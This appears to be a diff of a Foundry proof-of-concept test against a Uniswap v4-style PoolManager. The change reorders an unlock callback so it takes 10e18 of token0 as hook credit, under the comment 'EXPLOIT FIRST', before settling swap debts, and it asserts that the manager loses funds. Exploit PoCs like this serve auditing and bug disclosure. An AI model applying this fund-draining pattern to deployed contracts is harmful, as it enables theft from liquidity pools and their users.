@@ -1,4 +1,4 @@
-n// SPDX-License-Identifier: MIT
+// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.26;
 import "forge-std/Test.sol";
 import {PoolManager} from "../src/PoolManager.sol";
@@ -55,26 +55,26 @@ contract POC is Test {
             if(d.amount0()>0) manager.take(c0, address(this), uint128(d.amount0()));
             if(d.amount1()>0) manager.take(c1, address(this), uint128(d.amount1()));
         } else {
+            // SWAP - TAKE HOOK CREDIT FIRST
             BalanceDelta s = manager.swap(key, SwapParams(false,-0.1e18,TickMath.MAX_SQRT_PRICE-1), "");
-            // BOTH are negative, settle both
+            
+            // 1. EXPLOIT FIRST
+            manager.take(c0, address(this), 10e18);
+            
+            // 2. THEN CLEAR SMALL SWAP DEBTS/CREDITS
             if(s.amount0()<0){manager.sync(c0); token0.transfer(address(manager), uint128(-s.amount0())); manager.settle();}
             if(s.amount1()<0){manager.sync(c1); token1.transfer(address(manager), uint128(-s.amount1())); manager.settle();}
             if(s.amount0()>0) manager.take(c0, address(this), uint128(s.amount0()));
             if(s.amount1()>0) manager.take(c1, address(this), uint128(s.amount1()));
-            // HOOK CREDIT IS FOR TOKEN1 - THIS IS THE EXPLOIT
-            manager.take(c1, address(this), 10e18);
         }
         return "";
     }
 
     function test_afterSwapReturnDelta() public {
-        uint bBefore0 = token0.balanceOf(address(manager));
-        uint bBefore1 = token1.balanceOf(address(manager));
+        uint bBefore = token0.balanceOf(address(manager));
         manager.unlock(abi.encode(uint256(2)));
-        uint bAfter0 = token0.balanceOf(address(manager));
-        uint bAfter1 = token1.balanceOf(address(manager));
-        console.log("MANAGER LOSS token0:", bBefore0 - bAfter0);
-        console.log("MANAGER LOSS token1:", bBefore1 - bAfter1);
-        assertTrue(bAfter1 < bBefore1, "manager should lose token1");
+        uint bAfter = token0.balanceOf(address(manager));
+        console.log("MANAGER LOSS:", bBefore - bAfter);
+        assertLt(bAfter, bBefore, "manager lost funds");
     }
 }
